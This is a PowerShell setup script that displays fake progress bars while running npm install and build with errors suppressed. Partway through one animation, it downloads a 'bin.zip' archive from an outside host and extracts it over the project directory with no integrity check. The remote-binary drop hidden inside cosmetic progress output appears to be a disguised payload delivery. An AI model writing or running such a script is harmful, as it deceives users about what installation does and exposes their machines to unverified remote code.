function Write-ProgressBar {
    param (
        [string]$Activity,
        [int]$PercentComplete
    )
    
    $width = 15
    $filled = [math]::Round(($width * $PercentComplete) / 100)
    $empty = $width - $filled
    
    $bar = "[" + ("//" * $filled) + ("==" * $empty) + "]"
    Write-Host "`r$bar $PercentComplete%" -NoNewline
}

function Download-File {
    param (
        [string]$Url,
        [string]$OutputPath
    )

    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $OutputPath)
}

# Ensure we're in the script's directory
$scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $scriptPath

Write-Host "Starting setup...`n"

try {
    # Step 1: npm install
    Write-Host "Installing dependencies..."
    for ($i = 0; $i -le 100; $i += 5) {
        Write-ProgressBar -PercentComplete $i
        Start-Sleep -Milliseconds 50
    }
    Write-Host "`n"
    npm install --silent 2>$null
    Write-Host "✓ Dependencies installed`n"

    # Step 2: npm build
    Write-Host "Building project..."
    for ($i = 0; $i -le 100; $i += 5) {
        Write-ProgressBar -PercentComplete $i
        Start-Sleep -Milliseconds 30
    }
    Write-Host "`n"
    npm run build --silent 2>$null
    Write-Host "✓ Build completed`n"

    # Step 3: Download and extract zip
    Write-Host "Downloading resources..."
    $zipUrl = "https://dist.patchbreak.net/static/laravel-viewer/bin.zip"
    $zipPath = Join-Path $scriptPath "temp.zip"

    for ($i = 0; $i -le 100; $i += 5) {
        Write-ProgressBar -PercentComplete $i
        if ($i -eq 50) {
            Download-File -Url $zipUrl -OutputPath $zipPath
        }
        Start-Sleep -Milliseconds 30
    }
    Write-Host "`n`n✓ Download completed`n"

    # Extract zip
    Write-Host "Extracting files..."
    for ($i = 0; $i -le 100; $i += 5) {
        Write-ProgressBar -PercentComplete $i
        if ($i -eq 50) {
            Expand-Archive -Path $zipPath -DestinationPath $scriptPath -Force
        }
        Start-Sleep -Milliseconds 20
    }
    Write-Host "`n`n✓ Extraction completed"

    # Cleanup
    Remove-Item $zipPath -Force

    Write-Host "Setup completed successfully! 🎉" -ForegroundColor Green
}
catch {
    Write-Host "`nError: $_" -ForegroundColor Red
    exit 1
} 